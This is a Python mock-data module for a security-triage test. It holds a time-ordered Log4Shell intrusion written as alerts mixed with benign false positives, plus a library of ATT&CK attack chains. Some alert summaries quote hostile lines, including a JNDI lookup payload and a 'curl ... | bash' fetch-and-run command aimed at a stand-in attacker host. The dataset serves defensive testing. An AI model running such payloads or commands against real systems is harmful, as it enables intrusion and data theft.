"""mockdata.campaign — a time-series ATTACK CAMPAIGN + threat-chain library.

.. warning::
   **CLEARLY-LABELED MOCK DATA for POC / testing only.** No real company, host,
   person, malware, or intrusion. IPs are RFC-5737 doc ranges / RFC-1918 internal
   (10.x); domains end in example.test/example.com; hashes are valid-length SHA-256
   but fabricated; AWS account ids, if any, are ``000000000000``.

Why this module exists
----------------------
``world.py`` is the small canonical alert set and ``enterprise.py`` is the deep
attack-path topology. This module adds the missing TIME dimension: one coherent,
strictly time-ordered multi-stage intrusion (the "Log4Shell -> crown-jewel DB"
campaign) interleaved with benign/false-positive noise, PLUS a named threat-chain
library mapping ATT&CK technique sequences onto the enterprise topology.

It exists so the cross-domain END-TO-END pipeline scenario has a realistic,
connected story to drive: recon -> initial access -> execution -> C2 ->
persistence -> privilege escalation -> lateral movement -> collection ->
exfiltration -> cleanup, with FP noise a triage agent must separate from the real
signal, then feed the disposition back into detection strategy.

Every ``host`` is a real ``enterprise.py`` host id; every ``technique`` is a real
ATT&CK id; timestamps are strictly increasing. Authored by a parallel author +
independent-reviewer workflow (the reviewer confirmed host/hygiene/coherence and
flagged two ATT&CK sub-technique/stage mislabels, both fixed here).

Determinism
-----------
Literal Python data; no clock, no randomness, no I/O. Accessors return fresh deep
copies so a caller's mutation can't corrupt the shared source. Same query -> same data.
"""
from __future__ import annotations

import copy
from typing import Any, Dict, List

# The kill-chain stage vocabulary the campaign alerts are bucketed into.
STAGES = (
    "recon", "initial_access", "execution", "persistence",
    "privilege_escalation", "lateral_movement", "collection",
    "exfiltration", "defense_evasion", "benign",
)

# --------------------------------------------------------------------------- #
# CAMPAIGN — one coherent Log4Shell -> crown-jewel-DB intrusion, time-ordered,  #
# interleaved with benign / false-positive noise.                              #
# --------------------------------------------------------------------------- #
_CAMPAIGN_ALERTS: List[Dict[str, Any]] = [   {   'alert_id': 'alert-0001',
        'ts': '2026-07-13T08:00:12Z',
        'severity': 'medium',
        'rule_name': 'WEB Directory Brute-Force / Content Discovery',
        'host': 'web-01',
        'technique': 'T1595.003',
        'stage': 'recon',
        'true_positive': True,
        'src_ip': '203.0.113.66',
        'dst_ip': '10.10.1.11',
        'raw_summary': '1,842 sequential 404s from 203.0.113.66 against web-01 in 90s hitting '
                       '/admin,/manager,/api,/actuator wordlist paths; UA=Mozilla/5.0 '
                       'gobuster/3.6.'},
    {   'alert_id': 'alert-0002',
        'ts': '2026-07-13T08:04:33Z',
        'severity': 'low',
        'rule_name': 'Vuln Scanner Activity Detected',
        'host': 'web-01',
        'technique': 'T1595',
        'stage': 'benign',
        'true_positive': False,
        'src_ip': '10.50.1.5',
        'dst_ip': '10.10.1.11',
        'raw_summary': 'Authorized weekly Nessus sweep from monitor-01 (10.50.1.5); source is on '
                       'scanner allowlist, credentialed scan window 08:00-10:00 per approved '
                       'change. Benign FP.'},
    {   'alert_id': 'alert-0003',
        'ts': '2026-07-13T08:17:52Z',
        'severity': 'medium',
        'rule_name': 'HTTP Header Injection Probe',
        'host': 'web-01',
        'technique': 'T1595',
        'stage': 'recon',
        'true_positive': True,
        'src_ip': '203.0.113.66',
        'dst_ip': '10.10.1.11',
        'raw_summary': 'Probing X-Api-Version, User-Agent and X-Forwarded-For headers on web-01 '
                       'with canary strings ${test} and ${env:PATH}; reconnaissance for '
                       'expression/JNDI evaluation.'},
    {   'alert_id': 'alert-0004',
        'ts': '2026-07-13T08:33:20Z',
        'severity': 'info',
        'rule_name': 'Tor Exit Node Connection (Informational)',
        'host': 'proxy-01',
        'technique': 'T1090.003',
        'stage': 'benign',
        'true_positive': False,
        'src_ip': '203.0.113.150',
        'dst_ip': '10.10.1.2',
        'raw_summary': 'Single TLS connection to proxy-01 from known Tor exit 203.0.113.150; '
                       'matched threat-intel Tor feed, no session established, informational '
                       'only.'},
    {   'alert_id': 'alert-0005',
        'ts': '2026-07-13T08:41:07Z',
        'severity': 'critical',
        'rule_name': 'Log4Shell JNDI Exploit Attempt (CVE-2021-44228)',
        'host': 'web-01',
        'technique': 'T1190',
        'stage': 'initial_access',
        'true_positive': True,
        'src_ip': '203.0.113.66',
        'dst_ip': '10.10.1.11',
        'raw_summary': 'Inbound POST /api/search to web-01 with User-Agent: '
                       '${jndi:ldap://203.0.113.66:1389/Exploit}; Log4j 2.14 lookup triggered in '
                       'app log. Public-facing exploitation.'},
    {   'alert_id': 'alert-0006',
        'ts': '2026-07-13T08:41:59Z',
        'severity': 'critical',
        'rule_name': 'Outbound LDAP to Untrusted Host (JNDI Callback)',
        'host': 'web-01',
        'technique': 'T1190',
        'stage': 'initial_access',
        'true_positive': True,
        'src_ip': '10.10.1.11',
        'dst_ip': '203.0.113.66',
        'raw_summary': 'web-01 java PID 4412 opened outbound LDAP to 203.0.113.66:1389 and '
                       'retrieved remote class Exploit; confirms successful JNDI resolution of '
                       'Log4Shell payload.'},
    {   'alert_id': 'alert-0007',
        'ts': '2026-07-13T08:43:15Z',
        'severity': 'critical',
        'rule_name': 'Web Server Process Spawned Shell',
        'host': 'web-01',
        'technique': 'T1059.004',
        'stage': 'execution',
        'true_positive': True,
        'src_ip': None,
        'dst_ip': None,
        'raw_summary': "tomcat java process spawned /bin/sh -c 'curl -s http://198.51.100.23/s2 | "
                       "bash' on web-01; anomalous child of servlet container, no interactive "
                       'TTY.'},
    {   'alert_id': 'alert-0008',
        'ts': '2026-07-13T08:44:30Z',
        'severity': 'high',
        'rule_name': 'Ingress Tool Transfer via cURL',
        'host': 'web-01',
        'technique': 'T1105',
        'stage': 'execution',
        'true_positive': True,
        'src_ip': '10.10.1.11',
        'dst_ip': '198.51.100.23',
        'raw_summary': 'web-01 downloaded second-stage ELF from http://198.51.100.23/s2 to '
                       '/tmp/.sysd (sha256 '
                       '9f8e7d6c5b4a39281706f5e4d3c2b1a0998877665544332211ffeeddccbbaa00); dropped '
                       'by shell from alert-0007.'},
    {   'alert_id': 'alert-0009',
        'ts': '2026-07-13T08:46:10Z',
        'severity': 'high',
        'rule_name': 'Periodic Outbound HTTPS Beacon (C2)',
        'host': 'web-01',
        'technique': 'T1071.001',
        'stage': 'execution',
        'true_positive': True,
        'src_ip': '10.10.1.11',
        'dst_ip': '198.51.100.23',
        'raw_summary': 'Regular 60s-interval HTTPS beacons from web-01 to c2.example.test '
                       '(198.51.100.23), fixed 512-byte requests with high-entropy URI; JA3 '
                       'matches known implant. Outbound C2.'},
    {   'alert_id': 'alert-0010',
        'ts': '2026-07-13T08:52:00Z',
        'severity': 'low',
        'rule_name': 'Data Staging: Local Archive Creation',
        'host': 'backup-01',
        'technique': 'T1560.001',
        'stage': 'benign',
        'true_positive': False,
        'src_ip': None,
        'dst_ip': None,
        'raw_summary': 'backup-01 nightly cron tar/gzip of /var/lib to /backup/daily-20260713.tgz; '
                       'matches scheduled job backupd, ran 08:52 daily as expected. Benign FP.'},
    {   'alert_id': 'alert-0011',
        'ts': '2026-07-13T09:01:22Z',
        'severity': 'high',
        'rule_name': 'Web Shell Written to Web Root',
        'host': 'web-01',
        'technique': 'T1505.003',
        'stage': 'persistence',
        'true_positive': True,
        'src_ip': None,
        'dst_ip': None,
        'raw_summary': 'New JSP file /opt/tomcat/webapps/ROOT/status.jsp created by tomcat user '
                       '(sha256 1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f809); '
                       'contains Runtime.exec handler. Web shell persistence.'},
    {   'alert_id': 'alert-0012',
        'ts': '2026-07-13T09:05:44Z',
        'severity': 'medium',
        'rule_name': 'Cron Job Added for Suspicious Binary',
        'host': 'web-01',
        'technique': 'T1053.003',
        'stage': 'persistence',
        'true_positive': True,
        'src_ip': None,
        'dst_ip': None,
        'raw_summary': "New crontab entry for tomcat user: '*/10 * * * * /tmp/.sysd' re-launching "
                       'implant every 10 min on web-01; establishes beacon persistence across '
                       'restarts.'},
    {   'alert_id': 'alert-0013',
        'ts': '2026-07-13T09:10:03Z',
        'severity': 'info',
        'rule_name': 'Tor Exit Node Connection (Informational)',
        'host': 'proxy-01',
        'technique': 'T1090.003',
        'stage': 'benign',
        'true_positive': False,
        'src_ip': '203.0.113.150',
        'dst_ip': '10.10.1.2',
        'raw_summary': 'Repeat informational Tor exit hit on proxy-01 from 203.0.113.150; no auth, '
                       'dropped by egress policy. Recurrent low-value threat-feed noise.'},
    {   'alert_id': 'alert-0014',
        'ts': '2026-07-13T09:14:37Z',
        'severity': 'high',
        'rule_name': 'Local Privilege Escalation Exploit (pkexec)',
        'host': 'web-01',
        'technique': 'T1068',
        'stage': 'privilege_escalation',
        'true_positive': True,
        'src_ip': None,
        'dst_ip': None,
        'raw_summary': 'pkexec invoked with crafted argv by tomcat user on web-01 (PwnKit '
                       'CVE-2021-4034 pattern); process transitioned to uid=0. Exploitation for '
                       'privilege escalation.'},
    {   'alert_id': 'alert-0015',
        'ts': '2026-07-13T09:24:50Z',
        'severity': 'low',
        'rule_name': 'Internal Network Service Discovery',
        'host': 'monitor-01',
        'technique': 'T1046',
        'stage': 'benign',
        'true_positive': False,
        'src_ip': '10.50.1.5',
        'dst_ip': None,
        'raw_summary': 'monitor-01 ran authorized nmap service inventory across 10.20.0.0/16 app '
                       'subnet; scheduled asset-discovery job, source allowlisted. Benign FP.'},
    {   'alert_id': 'alert-0016',
        'ts': '2026-07-13T09:31:12Z',
        'severity': 'high',
        'rule_name': 'SSH Lateral Movement via Harvested Key',
        'host': 'app-01',
        'technique': 'T1021.004',
        'stage': 'lateral_movement',
        'true_positive': True,
        'src_ip': '10.10.1.11',
        'dst_ip': '10.20.1.21',
        'raw_summary': 'SSH login to app-01 from web-01 (10.10.1.11) as svc-app using key '
                       '/home/tomcat/.ssh/id_rsa harvested post-root; first-ever web-01->app-01 '
                       'SSH, off-hours for that path.'},
    {   'alert_id': 'alert-0017',
        'ts': '2026-07-13T09:35:05Z',
        'severity': 'medium',
        'rule_name': 'Lateral Tool Transfer (scp)',
        'host': 'app-01',
        'technique': 'T1570',
        'stage': 'lateral_movement',
        'true_positive': True,
        'src_ip': '10.10.1.11',
        'dst_ip': '10.20.1.21',
        'raw_summary': 'scp of /tmp/.sysd from web-01 to app-01:/tmp/.sysd over the new SSH '
                       'session; identical sha256 '
                       '9f8e7d6c5b4a39281706f5e4d3c2b1a0998877665544332211ffeeddccbbaa00 as web-01 '
                       'implant.'},
    {   'alert_id': 'alert-0018',
        'ts': '2026-07-13T09:42:20Z',
        'severity': 'high',
        'rule_name': 'Suspicious Binary Execution from /tmp',
        'host': 'app-01',
        'technique': 'T1059.004',
        'stage': 'execution',
        'true_positive': True,
        'src_ip': None,
        'dst_ip': None,
        'raw_summary': 'app-01 executed /tmp/.sysd as svc-app spawning /bin/sh; process beacons to '
                       'c2.example.test (198.51.100.23). Implant now live on app tier.'},
    {   'alert_id': 'alert-0019',
        'ts': '2026-07-13T09:48:11Z',
        'severity': 'low',
        'rule_name': 'Large Outbound Transfer to External Host',
        'host': 'proxy-01',
        'technique': 'T1048',
        'stage': 'benign',
        'true_positive': False,
        'src_ip': '10.10.1.2',
        'dst_ip': None,
        'raw_summary': '1.4GB egress from proxy-01 to cdn.example.com during asset publish; '
                       'destination on CDN allowlist, TLS pinned, matches release window. Benign '
                       'FP.'},
    {   'alert_id': 'alert-0020',
        'ts': '2026-07-13T09:55:33Z',
        'severity': 'critical',
        'rule_name': 'SSH to Crown-Jewel Database Host',
        'host': 'db-01',
        'technique': 'T1021.004',
        'stage': 'lateral_movement',
        'true_positive': True,
        'src_ip': '10.20.1.21',
        'dst_ip': '10.30.1.31',
        'raw_summary': 'SSH login to db-01 from app-01 (10.20.1.21) as svc-db; app-01->db-01 is a '
                       'restricted crown-jewel path normally used only by DBAs from bastion-01. '
                       'Anomalous source.'},
    {   'alert_id': 'alert-0021',
        'ts': '2026-07-13T10:02:47Z',
        'severity': 'critical',
        'rule_name': 'Bulk Database Dump / Local Data Collection',
        'host': 'db-01',
        'technique': 'T1005',
        'stage': 'collection',
        'true_positive': True,
        'src_ip': None,
        'dst_ip': None,
        'raw_summary': 'mysqldump --all-databases run as svc-db on db-01 to /tmp/cust.sql; 22GB '
                       'read from customers and payments schemas outside any backup window. '
                       'Crown-jewel collection.'},
    {   'alert_id': 'alert-0022',
        'ts': '2026-07-13T10:08:19Z',
        'severity': 'high',
        'rule_name': 'Collected Data Archived and Compressed',
        'host': 'db-01',
        'technique': 'T1560.001',
        'stage': 'collection',
        'true_positive': True,
        'src_ip': None,
        'dst_ip': None,
        'raw_summary': 'db-01 created /tmp/.cust.tgz from /tmp/cust.sql via tar+gzip by svc-db; '
                       'staging archive for exfil, hidden filename, immediately after dump in '
                       'alert-0021.'},
    {   'alert_id': 'alert-0023',
        'ts': '2026-07-13T10:12:05Z',
        'severity': 'low',
        'rule_name': 'Data Staging: Local Archive Creation',
        'host': 'backup-01',
        'technique': 'T1560.001',
        'stage': 'benign',
        'true_positive': False,
        'src_ip': None,
        'dst_ip': None,
        'raw_summary': 'backup-01 scheduled DB logical backup wrote /backup/db/db01-20260713.tgz; '
                       'legitimate barman/cron job, checksum registered in backup catalog. Benign '
                       'FP.'},
    {   'alert_id': 'alert-0024',
        'ts': '2026-07-13T10:19:52Z',
        'severity': 'critical',
        'rule_name': 'Exfiltration Over Alternative Protocol (SFTP)',
        'host': 'db-01',
        'technique': 'T1048',
        'stage': 'exfiltration',
        'true_positive': True,
        'src_ip': '10.30.1.31',
        'dst_ip': '198.51.100.23',
        'raw_summary': 'db-01 opened SFTP to 198.51.100.23:22 and uploaded /tmp/.cust.tgz (22GB) '
                       'directly to attacker C2 infra; egress bypassed normal proxy path. '
                       'Crown-jewel exfiltration.'},
    {   'alert_id': 'alert-0025',
        'ts': '2026-07-13T10:27:33Z',
        'severity': 'critical',
        'rule_name': 'Exfiltration Over C2 Channel',
        'host': 'web-01',
        'technique': 'T1041',
        'stage': 'exfiltration',
        'true_positive': True,
        'src_ip': '10.10.1.11',
        'dst_ip': '198.51.100.23',
        'raw_summary': 'web-01 implant switched from 512-byte beacons to sustained multi-MB '
                       'chunked HTTPS POSTs to c2.example.test (198.51.100.23); secondary exfil of '
                       'staged data over existing C2.'},
    {   'alert_id': 'alert-0026',
        'ts': '2026-07-13T10:35:10Z',
        'severity': 'info',
        'rule_name': 'Tor Exit Node Connection (Informational)',
        'host': 'proxy-01',
        'technique': 'T1090.003',
        'stage': 'benign',
        'true_positive': False,
        'src_ip': '203.0.113.150',
        'dst_ip': '10.10.1.2',
        'raw_summary': 'Recurring informational Tor exit hit on proxy-01 from 203.0.113.150; '
                       'blocked by egress ACL, no data transferred. Persistent threat-feed noise '
                       'unrelated to intrusion.'},
    {   'alert_id': 'alert-0027',
        'ts': '2026-07-13T10:41:00Z',
        'severity': 'high',
        'rule_name': 'Exfiltration to Cloud Storage',
        'host': 'db-01',
        'technique': 'T1567.002',
        'stage': 'exfiltration',
        'true_positive': True,
        'src_ip': '10.30.1.31',
        'dst_ip': '192.0.2.200',
        'raw_summary': 'db-01 uploaded second copy of /tmp/.cust.tgz to external bucket at '
                       'exfil.example.test (resolves 192.0.2.200) via HTTPS PUT; redundant exfil '
                       'channel for crown-jewel data.'},
    {   'alert_id': 'alert-0028',
        'ts': '2026-07-13T10:52:41Z',
        'severity': 'medium',
        'rule_name': 'Indicator Removal: Log/File Deletion',
        'host': 'db-01',
        'technique': 'T1070.004',
        'stage': 'defense_evasion',
        'true_positive': True,
        'src_ip': None,
        'dst_ip': None,
        'raw_summary': 'svc-db removed /tmp/cust.sql, /tmp/.cust.tgz and truncated ~/.bash_history '
                       'and /var/log/auth.log on db-01 after exfil; anti-forensic cleanup of the '
                       'collection/exfil trail.'}]


# --------------------------------------------------------------------------- #
# THREAT-CHAIN LIBRARY — named ATT&CK chains over the enterprise topology.      #
# --------------------------------------------------------------------------- #
_THREAT_CHAINS: List[Dict[str, Any]] = [   {   'id': 'TC-01',
        'name': 'Log4Shell to Crown-Jewel Database',
        'entry_host': 'web-01',
        'target_host': 'db-01',
        'hops': ['web-01', 'app-01', 'db-01'],
        'techniques': ['T1190', 'T1059.004', 'T1210', 'T1078', 'T1005', 'T1041'],
        'cve': 'CVE-2021-44228',
        'severity': 'critical',
        'description': 'Attacker triggers a JNDI lookup via a Log4j2 header on web-01, gains '
                       'remote code execution, pivots through the internal app-01 service tier '
                       'using recovered credentials, and exfiltrates data from the primary db-01 '
                       'crown-jewel database.'},
    {   'id': 'TC-02',
        'name': 'SSL-VPN Pre-Auth File Read to Domain Controller',
        'entry_host': 'vpn-01',
        'target_host': 'dc-01',
        'hops': ['vpn-01', 'jump-01', 'dc-01'],
        'techniques': ['T1190', 'T1078', 'T1021.001', 'T1003.001', 'T1003.003', 'T1098'],
        'cve': 'CVE-2019-11510',
        'severity': 'critical',
        'description': 'Pre-auth arbitrary file read on the SSL-VPN concentrator vpn-01 harvests '
                       'session credentials, which are reused to RDP into jump-01 and then dump '
                       'LSASS and NTDS on dc-01 for full domain compromise and persistence.'},
    {   'id': 'TC-03',
        'name': 'CI/CD Supply-Chain Pivot to Secrets Store',
        'entry_host': 'proxy-01',
        'target_host': 'secrets-01',
        'hops': ['proxy-01', 'api-01', 'cicd-01', 'secrets-01'],
        'techniques': ['T1190', 'T1071.001', 'T1195.002', 'T1552.004', 'T1552.001', 'T1555'],
        'cve': 'CVE-2024-23897',
        'severity': 'critical',
        'description': 'An exposed reverse proxy proxy-01 is abused to reach the internal api-01, '
                       'which trusts the build controller cicd-01 where a Jenkins '
                       'arbitrary-file-read flaw leaks build credentials that unlock poisoned '
                       'pipelines and ultimately the secrets-01 vault.'},
    {   'id': 'TC-04',
        'name': 'Phishing to Domain Controller via Kerberoasting',
        'entry_host': 'mail-01',
        'target_host': 'dc-01',
        'hops': ['mail-01', 'ws-01', 'dc-01'],
        'techniques': [   'T1566.001',
                          'T1204.002',
                          'T1059.001',
                          'T1558.003',
                          'T1550.003',
                          'T1003.006'],
        'cve': None,
        'severity': 'high',
        'description': 'A spearphishing attachment delivered through mail-01 executes on '
                       'workstation ws-01, PowerShell requests service tickets for Kerberoasting, '
                       'and the cracked service account enables Pass-the-Ticket and DCSync against '
                       'dc-01.'},
    {   'id': 'TC-05',
        'name': 'SSRF Proxy to Redis Crown-Jewel Store',
        'entry_host': 'proxy-01',
        'target_host': 'redis-data-01',
        'hops': ['proxy-01', 'api-02', 'cache-01', 'redis-data-01'],
        'techniques': ['T1190', 'T1090', 'T1071.001', 'T1210', 'T1005'],
        'cve': 'CVE-2022-0543',
        'severity': 'high',
        'description': 'A server-side request forgery on proxy-01 is relayed through api-02 and '
                       'the cache-01 layer to reach redis-data-01, where a Lua sandbox escape '
                       'yields code execution and bulk extraction of cached sensitive datasets.'},
    {   'id': 'TC-06',
        'name': 'Bastion SSH Brute-Force to Data Warehouse',
        'entry_host': 'bastion-01',
        'target_host': 'warehouse-01',
        'hops': ['bastion-01', 'jump-01', 'warehouse-01'],
        'techniques': ['T1110.001', 'T1078', 'T1021.004', 'T1213', 'T1048'],
        'cve': None,
        'severity': 'high',
        'description': 'Password guessing against the internet-facing bastion-01 yields a valid '
                       'account that is reused over SSH to jump-01 and then to warehouse-01, where '
                       'analytical data is queried and exfiltrated over an alternate protocol.'},
    {   'id': 'TC-07',
        'name': 'SQL Injection Web Shell to MySQL Store',
        'entry_host': 'web-02',
        'target_host': 'db-mysql-01',
        'hops': ['web-02', 'app-03', 'db-mysql-01'],
        'techniques': ['T1190', 'T1505.003', 'T1078', 'T1213', 'T1005', 'T1048'],
        'cve': None,
        'severity': 'high',
        'description': 'SQL injection on web-02 is escalated to a web shell that pivots into '
                       'app-03, reuses database service credentials, and reads and exfiltrates '
                       'records directly from the db-mysql-01 crown-jewel store.'},
    {   'id': 'TC-08',
        'name': 'SSL-VPN to Backup Destruction for Ransomware Prep',
        'entry_host': 'vpn-01',
        'target_host': 'backup-01',
        'hops': ['vpn-01', 'fileserver-01', 'backup-01'],
        'techniques': ['T1190', 'T1078', 'T1021.002', 'T1490', 'T1485'],
        'cve': 'CVE-2023-27997',
        'severity': 'high',
        'description': 'A heap overflow on the FortiOS SSL-VPN vpn-01 grants a foothold that '
                       'spreads over SMB to fileserver-01 and then to backup-01, where the actor '
                       'inhibits recovery and destroys backups to stage extortion.'}]


def campaign_alerts() -> List[Dict[str, Any]]:
    """Return the time-ordered campaign alert stream (fresh deep copy).

    Strictly increasing ``ts``; each alert carries ``stage`` +
    ``true_positive`` so a triage/correlation scenario can separate the real
    intrusion from the interleaved benign/FP noise."""
    return copy.deepcopy(_CAMPAIGN_ALERTS)


def threat_chains() -> List[Dict[str, Any]]:
    """Return the named threat-chain library (fresh deep copy)."""
    return copy.deepcopy(_THREAT_CHAINS)


def true_positive_alerts() -> List[Dict[str, Any]]:
    """The campaign alerts that are part of the REAL intrusion (``true_positive``)."""
    return [a for a in campaign_alerts() if a.get("true_positive")]


def false_positive_alerts() -> List[Dict[str, Any]]:
    """The benign / false-positive noise alerts (``true_positive`` is False)."""
    return [a for a in campaign_alerts() if not a.get("true_positive")]


def stats() -> Dict[str, int]:
    """Summary counts — used by tests + the __main__ smoke print."""
    a = _CAMPAIGN_ALERTS
    return {
        "alerts": len(a),
        "true_positive": sum(1 for x in a if x.get("true_positive")),
        "false_positive": sum(1 for x in a if not x.get("true_positive")),
        "stages": len({x["stage"] for x in a}),
        "threat_chains": len(_THREAT_CHAINS),
    }


if __name__ == "__main__":
    import json as _json
    print(_json.dumps(stats(), indent=2))
